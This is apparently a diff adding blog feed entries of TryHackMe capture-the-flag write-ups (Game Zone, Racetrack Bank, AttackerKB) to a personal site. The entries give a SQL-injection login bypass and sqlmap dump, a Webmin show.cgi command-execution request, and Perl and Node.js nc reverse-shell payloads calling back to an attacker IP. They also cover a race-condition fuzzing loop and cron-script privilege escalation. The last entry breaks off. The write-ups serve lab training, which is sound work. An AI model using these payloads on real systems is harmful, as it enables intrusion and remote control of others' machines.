+  &lt;li&gt;&lt;a href=&quot;#reverse-ssh-tunnels&quot;&gt;Reverse SSH tunnels&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#reverse-shell&quot;&gt;Reverse shell&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#root-flag&quot;&gt;Root Flag&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;!-- toc --&gt;
+
+&lt;h3 id=&quot;game-zone&quot;&gt;Game Zone&lt;/h3&gt;
+&lt;p&gt;Hallå gubbar , I’m a big fan of  Sql injection vulnerabilities  and i ‘m in love with Sqlmap  for ages and we are lucky to have this box to work on not hard at all and very easy if you follow up carefully .
+try it out at &lt;a href=&quot;https://tryhackme.com/room/gamezone&quot;&gt;Game Zone&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
+&lt;p&gt;Nmap scan &amp;amp; Results:&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; BoxIP
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;22/tcp open ssh&lt;/code&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80/tcp open http&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;so we have and web server and ssh services running so lets go to&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://Ip-Box:80/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
+&lt;p&gt;we will find a login with Agent-47 image which is vulnerable to auth sql injection&lt;/p&gt;
+
+&lt;p&gt;Try this to bypass&lt;/p&gt;
+
+&lt;p&gt;USERNAME: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin' or '1' = '1'; -- -&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;PASSWORD: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vvv&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;After login we can see that we have a search bar  (after trying other injection commands) we can confirm that it also vulnerable to sql injection in the “searchitem “id parameter&lt;/p&gt;
+
+&lt;p&gt;Now we can jump to sqlmap to dump data&lt;/p&gt;
+
+&lt;p&gt;What we need ?&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Get request&lt;/li&gt;
+  &lt;li&gt;Request file&lt;/li&gt;
+  &lt;li&gt;Sqlmap&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;results : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;userpass&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Command:&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; dirofrequest.txt  &lt;span class=&quot;nt&quot;&gt;--dbms&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mtsql &lt;span class=&quot;nt&quot;&gt;--dump&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Options&lt;/th&gt;
+      &lt;th&gt;Meaning&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;-r&lt;/td&gt;
+      &lt;td&gt;uses the intercepted request&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;–dbms&lt;/td&gt;
+      &lt;td&gt;type of database&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;–dump&lt;/td&gt;
+      &lt;td&gt;dump all data&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/4/requestsql.png&quot; alt=&quot;alt text&quot; title=&quot;THM&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/4/sqlagent.png&quot; alt=&quot;alt text&quot; title=&quot;THM&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;To crack the hash use any offline tools or online services&lt;/p&gt;
+
+&lt;h3 id=&quot;reverse-ssh-tunnels&quot;&gt;Reverse SSH tunnels&lt;/h3&gt;
+&lt;p&gt;so as we find earlier that we have a ssh service we will try to login with same credentials&lt;/p&gt;
+
+&lt;p&gt;this command :&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sshpass &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; Password ssh &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; Username Box-Ip 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;then run this command:&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ss &lt;span class=&quot;nt&quot;&gt;-tulpn&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ss&lt;/code&gt; to investigate sockets running on the host&lt;/p&gt;
+
+&lt;p&gt;we find that there’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5 TCP socket&lt;/code&gt; running and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1000 port&lt;/code&gt; is blocked via firewall rules&lt;/p&gt;
+
+&lt;p&gt;so now let try to kill processes using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ctrl+Z&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;then re-login to ssh using this command:&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ssh &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 10000:localhost:10000  Username@Box-Ip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/4/localhost.png&quot; alt=&quot;alt text&quot; title=&quot;THM&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;User Flag:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/4/flag1.png&quot; alt=&quot;alt text&quot; title=&quot;THM&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;then go to&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://localhost:10000/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;and just login with same credentials&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/4/webminversion.png&quot; alt=&quot;alt text&quot; title=&quot;THM&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;CMS Webmin version &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1.580&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;reverse-shell&quot;&gt;Reverse shell&lt;/h3&gt;
+
+&lt;p&gt;Use searchsploit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webmin&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/21851&quot;&gt;https://www.exploit-db.com/exploits/21851
+&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;We have two option to exploited either metasploit or manual …&lt;/p&gt;
+
+&lt;p&gt;go manual for faster results&lt;/p&gt;
+
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+
+&lt;span class=&quot;s1&quot;&gt;'Name'&lt;/span&gt;           &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Webmin /file/show.cgi Remote Command Execution'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+			&lt;span class=&quot;s1&quot;&gt;'Description'&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;sx&quot;&gt;%q{
+					This module exploits an arbitrary command execution vulnerability in Webmin
+				1.580. The vulnerability exists in the /file/show.cgi component and allows an
+				authenticated user, with access to the File Manager Module, to execute arbitrary
+				commands with root privileges. The module has been tested successfully with Webim
+				1.580 over Ubuntu 10.04.
+res = send_request_cgi(
+			{
+				'uri'     =&amp;gt; &quot;/file/show.cgi/bin/#{rand_text_alphanumeric(rand(5) + 5)}|#{command}|&quot;,
+				'cookie'  =&amp;gt; &quot;sid=#{session}&quot;
+			}, 25)
+
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://localhost:1000/file/show.cgi/bin/#&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;rand_text_alphanumeric&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5&lt;span class=&quot;o&quot;&gt;)}&lt;/span&gt;|#&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;|
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://localhost:1000/file/show.cgi/bin/#&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;rand_text_alphanumeric&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5&lt;span class=&quot;o&quot;&gt;)}&lt;/span&gt;|perl%20-e%20&lt;span class=&quot;s1&quot;&gt;'use%20Socket;$i=%22Your-ip%22;$p=Your-PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,%22%3E&amp;amp;S%22);open(STDOUT,%22%3E&amp;amp;S%22);open(STDERR,%22%3E&amp;amp;S%22);exec(%22/bin/sh%20-i%22);};'&lt;/span&gt;%20|
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/4/flagroot.png&quot; alt=&quot;alt text&quot; title=&quot;THM&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The end …see you next time&lt;/p&gt;
+
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Racetrack Bank | Writeup</title>
+   <link href="https://www.thelastvvv.com//2020/07/14/racetrack-bank-writeup"/>
+   <updated>2020-07-14T07:00:53+02:00</updated>
+   <id>https://www.thelastvvv.com//2020/07/14/Racetrack-bank-[Writeup]</id>
+   <content type="html">&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;#racetrack-bank&quot;&gt;Racetrack Bank&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#enumeration&quot;&gt;Enumeration&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#exploitation&quot;&gt;Exploitation&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#reverse-shell&quot;&gt;Reverse shell&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#flags&quot;&gt;Flags&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;!-- toc --&gt;
+
+&lt;h3 id=&quot;racetrack-bank&quot;&gt;Racetrack Bank&lt;/h3&gt;
+&lt;p&gt;Hallå gubbar, this one is a lil bit difficult but hey we can do it specially if you want to learn more and practice on race condition vulnerabilities … check the box &lt;a href=&quot;https://tryhackme.com/room/racetrackbank&quot;&gt;Racetrack Bank&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/2/scanbank.png&quot; alt=&quot;alt text&quot; title=&quot;THM&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After we scan using Nmap we found 80 port open = http&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http:/ip-box:80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/2/main.png&quot; alt=&quot;alt text&quot; title=&quot;THM&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;then it will redirect you to the login page
+we found other 2 pages 
+give gold ( to send gold to other users) / purchase (buy premium )&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/2/buyme.png&quot; alt=&quot;alt text&quot; title=&quot;THM&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/2/givegold.png&quot; alt=&quot;alt text&quot; title=&quot;THM&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We also have 1 gold ….&lt;/p&gt;
+
+&lt;p&gt;Nothing else so what we need to do is find out the premium features but how is that ?&lt;/p&gt;
+
+&lt;p&gt;Drom the description and title of the box is possible to say that there’s race conditions vulnerabilities&lt;/p&gt;
+
+&lt;p&gt;so let fuzz it!!&lt;/p&gt;
+
+&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
+
+&lt;p&gt;How ?
+we need to fuzz and send multi requests to transfer gold from an account to an other 
+Result:
+Farming gold&lt;/p&gt;
+
+&lt;p&gt;What we need ?&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Creating accounts&lt;/li&gt;
+  &lt;li&gt;Cookies id tag&lt;/li&gt;
+  &lt;li&gt;Loop requests&lt;/li&gt;
+  &lt;li&gt;Buy premium&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;i will try to make it easy for you&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;create account ( test22 ) also create an other account in private tab (test99)&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;we need to intercept the gold transfer request using BURPYYY…&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/2/burp.png&quot; alt=&quot;alt text&quot; title=&quot;THM&quot; /&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;Now we got cookie id tag (request)&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Loop requests in this case we will use wfuzz&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;but first create txt file and each line should have number 1 ( 1 gold remember ) and you should have 20 000 line&lt;/p&gt;
+
+&lt;p&gt;” Dont worry i said i will make it easy for you “&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://pastebin.com/MxnwWnWG&quot;&gt;https://pastebin.com/MxnwWnWG&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;command :&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /root/Desktop/gold.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://Box-ip/api/givegold &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Type: application/x-www-form-urlencoded&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Cookie ID&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;user=test99&amp;amp;amount=FUZZ&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Options&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;Meaning&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;-w&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;wordlist&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;-u&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;url&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;-H&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;header&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;-b&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;cookie&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;-d&lt;/td&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;postdata&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;So don’t waste too much time going back from an account t oan other&lt;/p&gt;
+
+&lt;p&gt;just once you reach 600 gold change 1 gold to 6 gold in text file&lt;/p&gt;
+
+&lt;p&gt;also send gold from account test22 to test99&lt;/p&gt;
+
+&lt;p&gt;also send back 600 from test99 without fuzzing it&lt;/p&gt;
+
+&lt;p&gt;then go back to test22 and fuzz it again&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;so in 3 steps you will have more 10k gold enough to buy premium !&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/2/10kgold.png&quot; alt=&quot;alt text&quot; title=&quot;THM&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;reverse-shell&quot;&gt;Reverse shell&lt;/h3&gt;
+
+&lt;p&gt;To be frank i tried many injections command but nothing worked until checked source code (node.js)&lt;/p&gt;
+
+&lt;p&gt;so just google node.js reverse shell&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://Ip-box/premuimfeatures.html?ans&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;require&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;child_process&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.exec&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc YOUR-IP PORT &amp;gt;/tmp/f'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;voila!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/2/shell.png&quot; alt=&quot;alt text&quot; title=&quot;THM&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;flags&quot;&gt;Flags&lt;/h3&gt;
+
+&lt;p&gt;we got the user flag :&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat  &lt;/span&gt;user.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Now we need to privesc to root but i’m lazy specially late nights so just searched for backup files and we find
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sh/cleanup/&lt;/code&gt;file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cleanupscript.sh&lt;/code&gt; that runs every minute.&lt;/p&gt;
+
+&lt;p&gt;So we can optin to get second reverse shell as root or copy and output root flag&lt;/p&gt;
+
+&lt;p&gt;so you either&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;rm &lt;/span&gt;cleanupscript.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;or&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;cleanupscript.sh &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; cleanupscript.sh.backup &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; check dogcat room similar&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;then&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'cat /root/root.txt &amp;gt; /home/brian/root_flag.txt'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; cleanupscript.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;777 cleanupscript.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Run it and wait 1 min then check for for output&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/2/rootflag.png&quot; alt=&quot;alt text&quot; title=&quot;THM&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;See you next time ……&lt;/p&gt;
+
+</content>
+ </entry>
+ 
+ <entry>
+   <title>AttackerKB &amp; Source | Writeup</title>
+   <link href="https://www.thelastvvv.com//2020/07/11/attackerkb-source-writeup"/>
+   <updated>2020-07-11T12:42:53+02:00</updated>
+   <id>https://www.thelastvvv.com//2020/07/11/Attackerkb-Source-[Writeup]</id>
+   <content type="html">&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;#attackerkb--source&quot;&gt;AttackerKB &amp;amp; Source&lt;/a&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#enumeration&quot;&gt;Enumeration:&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#exploitation&quot;&gt;Exploitation&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#reverse-shell&quot;&gt;Reverse shell&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#attackerkb-tasks&quot;&gt;AttackerKB Tasks:&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;!-- toc --&gt;
+
+&lt;h2 id=&quot;attackerkb--source&quot;&gt;AttackerKB &amp;amp; Source&lt;/h2&gt;
+
+&lt;p&gt;Hallå gubbar , Today i will show you how easy this boxes are in a very simple explanation both &lt;a href=&quot;https://tryhackme.com/room/attackerkb&quot;&gt;AttackerKB&lt;/a&gt; &amp;amp;  &lt;a href=&quot;https://tryhackme.com/room/source&quot;&gt;Source&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration:&lt;/h3&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; Box-ip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Results:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+| 2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
+| 256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
+|_ 256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
+10000/tcp open http MiniServ 1.890 (Webmin httpd)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
+&lt;p&gt;Source and AttackerKB:&lt;/p&gt;
+
+&lt;p&gt;One of the attached files of vulnerability is metasploit module that will allow us reverse shell the box so let open Metasploit&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;&quot;&gt;https://github.com/rapid7/metasploit-framework/pull/12219&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;using this command:&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;msfconsole
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;then search “the exploit name or version”&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/1/attack.png&quot; alt=&quot;alt text&quot; title=&quot;search&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;then choose&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unix/webapp/webmin_backdoor
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/1/attavk.png&quot; alt=&quot;alt text&quot; title=&quot;metasploit&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;RHOSTS : Box-ip&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
